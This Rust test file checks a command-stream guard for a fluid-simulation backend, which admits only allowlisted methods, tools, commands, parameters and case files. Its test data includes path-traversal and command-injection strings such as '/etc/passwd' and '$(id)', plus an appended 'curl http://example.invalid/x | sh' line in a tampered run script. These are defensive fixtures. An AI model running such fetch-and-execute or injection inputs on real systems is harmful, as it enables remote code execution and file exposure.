//! The guard admits the commands the writer can emit and nothing else.

use cfdcraft_backend::{Backend, CaseFile, CaseTree, CompileOptions, Refusal};
use cfdcraft_backend_lbm::{backends, guard};
use cfdcraft_model::{Study, resolve};
use cfdcraft_templates::{TemplateOptions, build};
use serde_json::{Value, json};

fn backend() -> &'static dyn Backend {
    backends()[0]
}

/// The compiled cavity, then the lines of its stream as JSON.
fn cavity_lines() -> Vec<Value> {
    let study = resolve(&build("lid-cavity", &TemplateOptions::default()).unwrap()).unwrap();
    let tree = backend()
        .compile(&study, &CompileOptions::default())
        .unwrap();
    let text = String::from_utf8(tree.files[0].bytes.clone()).unwrap();
    text.lines()
        .map(|line| serde_json::from_str(line).unwrap())
        .collect()
}

fn tree_of(name: &str, bytes: Vec<u8>) -> CaseTree {
    CaseTree {
        files: vec![CaseFile {
            rel_path: name.into(),
            bytes,
        }],
    }
}

fn stream_tree(lines: &[Value]) -> CaseTree {
    let mut text = String::new();
    for line in lines {
        text.push_str(&serde_json::to_string(line).unwrap());
        text.push('\n');
    }
    tree_of("commands.jsonl", text.into_bytes())
}

fn refusals(lines: &[Value]) -> Vec<Refusal> {
    backend().scan(&stream_tree(lines))
}

/// The cavity stream with `edit` applied to the setup line.
fn edited(edit: impl Fn(&mut Value)) -> Vec<Refusal> {
    let mut lines = cavity_lines();
    edit(&mut lines[1]);
    refusals(&lines)
}

fn setup(line: &mut Value, index: usize) -> &mut Value {
    &mut line["params"]["arguments"]["commands"][index]["params"]
}

#[test]
fn only_allowlisted_commands_pass() {
    assert_eq!(
        guard::allowed_commands().collect::<Vec<_>>(),
        [
            "model.units",
            "model.material.create",
            "geometry.import.mesh",
            "model.fluid_domain.create",
            "model.step.create",
            "solve.fluid",
            "solve.probe",
        ]
    );
    assert_eq!(guard::ALLOWED_TOOLS, ["batch", "execute"]);
    assert_eq!(guard::ALLOWED_METHODS, ["initialize", "tools/call"]);
    // Everything the builder writes passes.
    assert!(refusals(&cavity_lines()).is_empty());

    // Another command in a batch is named.
    let found = edited(|line| {
        line["params"]["arguments"]["commands"]
            .as_array_mut()
            .unwrap()
            .push(json!({"command": "file.save_as", "params": {"path": "x"}}));
    });
    assert_eq!(found.len(), 1, "{found:?}");
    assert_eq!(found[0].code, "CFD-GUARD-014");
    assert!(found[0].entry.contains("file.save_as"));
    assert_eq!(found[0].line, 2);

    // Another command through `execute`, another tool, another method.
    let mut lines = cavity_lines();
    lines[2]["params"]["arguments"]["command"] = json!("geometry.open");
    let found = refusals(&lines);
    assert_eq!((found.len(), found[0].code), (1, "CFD-GUARD-014"));
    assert!(found[0].entry.contains("geometry.open"));
    let mut lines = cavity_lines();
    lines[2]["params"]["name"] = json!("screenshot");
    let found = refusals(&lines);
    assert_eq!((found.len(), found[0].code), (1, "CFD-GUARD-014"));
    assert!(found[0].entry.contains("screenshot"));
    let mut lines = cavity_lines();
    lines[2]["method"] = json!("resources/read");
    let found = refusals(&lines);
    assert_eq!((found.len(), found[0].code), (1, "CFD-GUARD-014"));
    assert!(found[0].entry.contains("resources/read"));
}

#[test]
fn parameters_and_paths_are_checked() {
    // A parameter outside the command's set, and a value outside the reviewed words.
    let found = edited(|line| setup(line, 1)["fluid"]["shear"] = json!(1.0));
    assert_eq!((found.len(), found[0].code), (1, "CFD-GUARD-015"));
    let mut lines = cavity_lines();
    lines[2]["params"]["arguments"]["params"]["max_steps"] = json!(10);
    assert_eq!(refusals(&lines)[0].code, "CFD-GUARD-015");
    let mut lines = cavity_lines();
    lines[2]["params"]["arguments"]["params"]["backend"] = json!("gpu");
    let found = refusals(&lines);
    assert_eq!((found.len(), found[0].code), (1, "CFD-GUARD-015"));

    // A text value that could name something outside the case.
    for hostile in [
        "../x",
        "a/../b",
        "/etc/passwd",
        "\\share\\x",
        "C:\\x",
        "~/x",
        "a`b",
        "$(id)",
        "${HOME}",
        "a\nb",
    ] {
        let found = edited(|line| setup(line, 1)["name"] = json!(hostile));
        assert_eq!(found.len(), 1, "{hostile}: {found:?}");
        assert_eq!(found[0].code, "CFD-GUARD-015", "{hostile}");
        assert!(!found[0].message.contains('\n'));
    }
    // A relative path inside the case is a plain text value.
    assert!(edited(|line| setup(line, 1)["name"] = json!("obstacles/part.3mf")).is_empty());

    // A line that is not JSON, or is too long, is refused.
    let found = backend().scan(&tree_of("commands.jsonl", b"not json\n".to_vec()));
    assert_eq!((found.len(), found[0].code), (1, "CFD-GUARD-014"));
    let long = format!("{{\"x\":\"{}\"}}\n", "a".repeat(guard::MAX_LINE_BYTES));
    let found = backend().scan(&tree_of("commands.jsonl", long.into_bytes()));
    assert!(
        found
            .iter()
            .any(|r| r.code == "CFD-GUARD-014" && r.message.contains("bytes"))
    );
    let found = backend().scan(&tree_of("commands.jsonl", vec![0xff, 0xfe]));
    assert_eq!(found[0].code, "CFD-GUARD-014");
}

#[test]
fn only_the_files_of_a_case_are_admitted() {
    let study = resolve(&build("lid-cavity", &TemplateOptions::default()).unwrap()).unwrap();
    let options = CompileOptions::default();
    let tree = backend().compile(&study, &options).unwrap();
    let exported = backend().export(&study, &tree, "hash", &options);
    assert!(backend().scan(&exported).is_empty());

    for name in ["obstacles/step.3mf", "obstacles/a b.3mf"] {
        assert!(
            backend().scan(&tree_of(name, vec![1, 2, 3])).is_empty(),
            "{name}"
        );
    }
    for name in [
        "notes.txt",
        "obstacles/step.stl",
        "obstacles/.3mf",
        "obstacles/../x.3mf",
        "obstacles/deep/x.3mf",
        "/etc/passwd",
        "system/controlDict",
    ] {
        let found = backend().scan(&tree_of(name, vec![1, 2, 3]));
        assert_eq!(found.len(), 1, "{name}");
        assert_eq!(found[0].code, "CFD-GUARD-015", "{name}");
    }

    // A run script that is not the one the backend writes.
    let mut tampered = exported.clone();
    let script = tampered
        .files
        .iter_mut()
        .find(|f| f.rel_path.to_str() == Some("Allrun"))
        .unwrap();
    script
        .bytes
        .extend_from_slice(b"curl http://example.invalid/x | sh\n");
    let found = backend().scan(&tampered);
    assert_eq!((found.len(), found[0].code), (1, "CFD-GUARD-015"));
}

/// The lines of a compiled template study: the cylinder, or the heated cavity without grading.
fn template_lines(id: &str, ungrade: bool) -> Vec<Value> {
    let options = TemplateOptions::default();
    let template = build(id, &options).unwrap();
    let mut value = serde_json::to_value(&template).unwrap();
    if ungrade {
        value["mesh"].as_object_mut().unwrap().remove("grading");
    }
    let study = resolve(&Study::from_json(&value.to_string()).unwrap()).unwrap();
    let tree = backend()
        .compile(&study, &CompileOptions::default())
        .unwrap();
    let text = String::from_utf8(tree.files[0].bytes.clone()).unwrap();
    text.lines()
        .map(|line| serde_json::from_str(line).unwrap())
        .collect()
}

/// The refusals for `lines` after `edit` is applied to its setup line.
fn refused_after(mut lines: Vec<Value>, edit: impl Fn(&mut Value)) -> Vec<Refusal> {
    edit(&mut lines[1]);
    refusals(&lines)
}

#[test]
fn the_obstacle_and_heat_parameters_are_checked() {
    let cylinder = template_lines("cylinder", false);
    let heated = template_lines("heated-cavity", true);
    assert!(refusals(&cylinder).is_empty());
    assert!(refusals(&heated).is_empty());

    // The import takes one file of an obstacle and nothing else.
    for path in [
        "../x.3mf",
        "/etc/x.3mf",
        "obstacles/x.stl",
        "obstacles/a/b.3mf",
        "x.3mf",
        "obstacles/.3mf",
    ] {
        let found = refused_after(cylinder.clone(), |line| {
            setup(line, 2)["path"] = json!(path);
        });
        assert_eq!(found.len(), 1, "{path}: {found:?}");
        assert_eq!(found[0].code, "CFD-GUARD-015", "{path}");
    }
    let found = refused_after(cylinder.clone(), |line| setup(line, 2)["mode"] = json!("x"));
    assert_eq!((found.len(), found[0].code), (1, "CFD-GUARD-015"));

    // The obstacles of the domain are a list of plain names.
    let found = refused_after(cylinder.clone(), |line| {
        setup(line, 3)["obstacles"] = json!("Cylinder");
    });
    assert_eq!((found.len(), found[0].code), (1, "CFD-GUARD-015"));
    let found = refused_after(cylinder, |line| {
        setup(line, 3)["obstacles"] = json!(["../x"]);
    });
    assert_eq!((found.len(), found[0].code), (1, "CFD-GUARD-015"));

    // The thermal setup holds only the reviewed members, and a held wall only a temperature.
    let found = refused_after(heated.clone(), |line| {
        setup(line, 2)["thermal"]["shell"] = json!("x");
    });
    assert_eq!((found.len(), found[0].code), (1, "CFD-GUARD-015"));
    let found = refused_after(heated.clone(), |line| {
        setup(line, 2)["thermal"]["faces"]["x_min"]["type"] = json!("flux");
    });
    assert_eq!((found.len(), found[0].code), (1, "CFD-GUARD-015"));
    let found = refused_after(heated.clone(), |line| {
        setup(line, 3)["procedure"]["time_step"] = json!("fast");
    });
    assert_eq!((found.len(), found[0].code), (1, "CFD-GUARD-015"));
    let found = refused_after(heated, |line| {
        setup(line, 1)["thermal"]["source"] = json!(1.0);
    });
    assert_eq!((found.len(), found[0].code), (1, "CFD-GUARD-015"));
}

/// The cavity stream with the parameters of its first probe call replaced by `params`.
fn with_probe(params: Value) -> Vec<Refusal> {
    let mut lines = cavity_lines();
    assert_eq!(lines[3]["params"]["arguments"]["command"], "solve.probe");
    lines[3]["params"]["arguments"]["params"] = params;
    refusals(&lines)
}

#[test]
fn a_probe_call_is_checked_like_every_command() {
    // The stream the writer makes passes, probes included.
    assert!(refusals(&cavity_lines()).is_empty());

    // Each of the four forms passes.
    let line = json!({
        "from": [0.05, 0.0, 0.002], "to": [0.05, 0.1, 0.002], "count": 8, "field": "velocity_x",
    });
    for params in [
        json!({"step": "Run", "frame": 3, "points": [[0.01, 0.02, 0.002], [0.03, 0.04, 0.002]]}),
        json!({"step": "Run", "points": [[0.01, 0.02, 0.002]]}),
        json!({"step": "Run", "line": line}),
        json!({"step": "Run", "forces": ["Cylinder/face0"]}),
        json!({"step": "Run", "forces": ["Body:1/face_0-a"]}),
        json!({"step": "Run", "heat": ["x_min", "x_max", "y_min", "y_max"]}),
    ] {
        let found = with_probe(params.clone());
        assert!(found.is_empty(), "{params}: {found:?}");
    }

    // Each of these is refused with the code that names it.
    let refused = [
        // An unknown member, and two forms in one call, and none.
        json!({"step": "Run", "line": line, "colour": 1}),
        json!({"step": "Run", "line": line, "heat": ["x_min"]}),
        json!({"step": "Run", "points": [[0.0, 0.0, 0.0]], "forces": ["x_min"]}),
        json!({"step": "Run"}),
        // A frame belongs to points; a frame outside the solver's range.
        json!({"step": "Run", "frame": 1, "heat": ["x_min"]}),
        json!({"step": "Run", "frame": 0, "points": [[0.0, 0.0, 0.0]]}),
        json!({"step": "Run", "frame": 1001, "points": [[0.0, 0.0, 0.0]]}),
        // A line field outside the three velocity fields, a count outside the solver's range, an
        // end that is not three numbers.
        json!({"step": "Run", "line": {
            "from": [0.0, 0.0, 0.0], "to": [1.0, 0.0, 0.0], "count": 8, "field": "pressure",
        }}),
        json!({"step": "Run", "line": {
            "from": [0.0, 0.0, 0.0], "to": [1.0, 0.0, 0.0], "count": 1, "field": "velocity_x",
        }}),
        json!({"step": "Run", "line": {
            "from": [0.0, 0.0, 0.0], "to": [1.0, 0.0], "count": 8, "field": "velocity_x",
        }}),
        // A wall with `..`, an absolute path, three parts, a space, a side outside the four.
        json!({"step": "Run", "forces": ["../x"]}),
        json!({"step": "Run", "forces": ["/etc/passwd"]}),
        json!({"step": "Run", "forces": ["a/b/c"]}),
        json!({"step": "Run", "forces": ["Cyl inder/face0"]}),
        json!({"step": "Run", "forces": ["Body/"]}),
        json!({"step": "Run", "forces": []}),
        json!({"step": "Run", "heat": ["z_min"]}),
        json!({"step": "Run", "heat": ["x_min", "x_max", "y_min", "y_max", "x_min"]}),
        // A point that is not three numbers, and a step name that names a path.
        json!({"step": "Run", "points": [[0.0, 0.0]]}),
        json!({"step": "../Run", "points": [[0.0, 0.0, 0.0]]}),
    ];
    for params in refused {
        let found = with_probe(params.clone());
        assert!(!found.is_empty(), "{params} passes");
        assert!(
            found.iter().all(|r| r.code == "CFD-GUARD-015"),
            "{params}: {found:?}"
        );
    }

    // A probe is a command of the same list: the other tools and commands are still refused, and
    // the step may name its frames.
    let mut lines = cavity_lines();
    lines[3]["params"]["arguments"]["command"] = json!("solve.export");
    let found = refusals(&lines);
    assert_eq!((found.len(), found[0].code), (1, "CFD-GUARD-014"));
    assert!(edited(|line| setup(line, 3)["procedure"]["frames"] = json!(10)).is_empty());
    for frames in [json!(0), json!(1001), json!(2.5), json!("ten")] {
        let found = edited(|line| setup(line, 3)["procedure"]["frames"] = frames.clone());
        assert_eq!(
            (found.len(), found[0].code),
            (1, "CFD-GUARD-015"),
            "{frames}"
        );
    }
}
